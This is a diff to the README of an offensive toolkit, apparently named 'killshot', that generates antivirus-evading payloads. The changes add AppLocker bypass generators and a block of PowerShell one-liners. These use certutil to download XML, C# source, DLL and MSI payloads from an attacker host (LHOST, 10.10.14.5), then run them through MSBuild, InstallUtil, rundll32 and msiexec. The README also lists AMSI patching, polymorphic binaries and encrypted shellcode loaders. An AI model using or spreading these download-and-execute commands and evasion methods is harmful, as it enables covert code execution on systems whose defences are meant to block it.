@@ -46,6 +46,8 @@ certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
 | `gen_stager.py` | Generates PowerShell stager with AMSI bypass |
 | `gen_potato.py` | Converts potato exploits to shellcode with baked-in commands |
 | `gen_tool_stager.py` | Generates PowerShell in-memory loaders (fallback) |
+| `gen_msi.py` | MSI/DLL AppLocker bypass (custom action DLL via wixl/MinGW) |
+| `gen_applocker.py` | MSBuild XML and InstallUtil C# AppLocker bypasses |
 
 ## Included Tools
 
@@ -109,6 +111,11 @@ killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
 killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
 killshot generate --loaders                             # PowerShell tool loaders
 
+# AppLocker bypass payloads (requires implant shellcode)
+killshot generate --msi                                 # MSI/DLL for msiexec/rundll32
+killshot generate --msbuild                             # MSBuild XML inline C# task
+killshot generate --installutil                         # InstallUtil C# source
+
 # Generate everything at once
 killshot generate --all -l 10.10.14.5
 ```
@@ -145,6 +152,27 @@ certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\r.exe
 IEX(IWR -UseBasicParsing http://LHOST:PORT/stager.ps1)
 ```
 
+### AppLocker Bypass (when EXE execution is blocked)
+
+```powershell
+# MSBuild — download XML, execute via trusted .NET binary
+certutil -urlcache -split -f http://LHOST:PORT/build.xml %TEMP%\b.xml
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe %TEMP%\b.xml
+
+# InstallUtil — download CS, compile on target, execute via trusted binary
+certutil -urlcache -split -f http://LHOST:PORT/service.cs %TEMP%\s.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:%TEMP%\s.dll %TEMP%\s.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\s.dll
+
+# DLL via rundll32 — trusted path or direct execution
+certutil -urlcache -split -f http://LHOST:PORT/update.dll %TEMP%\u.dll
+rundll32.exe %TEMP%\u.dll,ExportName 0
+
+# MSI via msiexec (if wixl-generated .msi available)
+certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
+msiexec /i %TEMP%\u.msi /qn
+```
+
 ## Evasion Techniques
 
 - **Polymorphic runner** — unique binary each build (random identifiers, junk functions, API string splits)
@@ -156,6 +184,8 @@ IEX(IWR -UseBasicParsing http://LHOST:PORT/stager.ps1)
 - **AMSI bypass** — reflection-based patching with byte-array obfuscated class names
 - **Garble compilation** — Go binary obfuscation (when supported by Go version)
 - **No disk artifacts** — tools never touch disk, loaded directly into memory via runner
+- **AppLocker bypass** — MSBuild XML, InstallUtil, MSI custom action, rundll32 via trusted paths
+- **XOR-encrypted DLL** — loader DLL with randomized exports and encrypted shellcode
 
 ## Directory Structure
 
@@ -167,6 +197,8 @@ avbypass/
 ├── gen_runner.py         # Polymorphic runner generator
 ├── gen_stager.py         # PowerShell stager generator
 ├── gen_potato.py         # Potato privesc generator
+├── gen_msi.py            # MSI/DLL AppLocker bypass generator
+├── gen_applocker.py      # MSBuild/InstallUtil AppLocker bypass
 ├── gen_tool_stager.py    # Tool loader generator
 ├── go.mod / go.sum       # Go module (cached for offline)
 ├── tools/
